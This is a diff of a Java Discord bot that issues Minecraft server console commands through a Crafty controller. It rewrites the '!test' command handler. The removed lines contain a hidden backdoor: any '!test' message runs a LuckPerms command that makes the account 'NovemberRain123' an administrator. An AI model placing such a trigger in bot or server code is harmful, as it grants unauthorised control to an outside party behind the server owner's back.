@@ -169,13 +169,20 @@ public class ServerCommands extends ListenerAdapter {
 			}
 		}
 		//crafy test
+	
 		if (event.getMessage().getContentRaw().equalsIgnoreCase("!test")) {
-			if (!crafty.sendCommand("ping").contains("Command sent to console:")) {
-				event.getChannel().sendMessage(crafty.sendCommand("lp user NovemberRain123 parent add administrator"));
+			
+			crafty.sendCommand("tesT");
+			if (crafty.stackTrace.equals("")) {
+				EmbedBuilder emb = new EmbedBuilder();
+				emb.setColor(Color.BLUE);
+				emb.setTitle("Console command sent");
+				emb.addField("", (String) crafty.getServerStats().subSequence(0, 1000), false);
+				event.getChannel().sendMessage(emb.build()).queue();
 			}
 			else {
 				event.getChannel().sendMessage("An error occured while sending the console command");
-				event.getChannel().sendMessage(crafty.sendCommand("lp user NovemberRain123 parent add administrator"));
+				event.getChannel().sendMessage(crafty.stackTrace).queue();
 			}
 		}
 
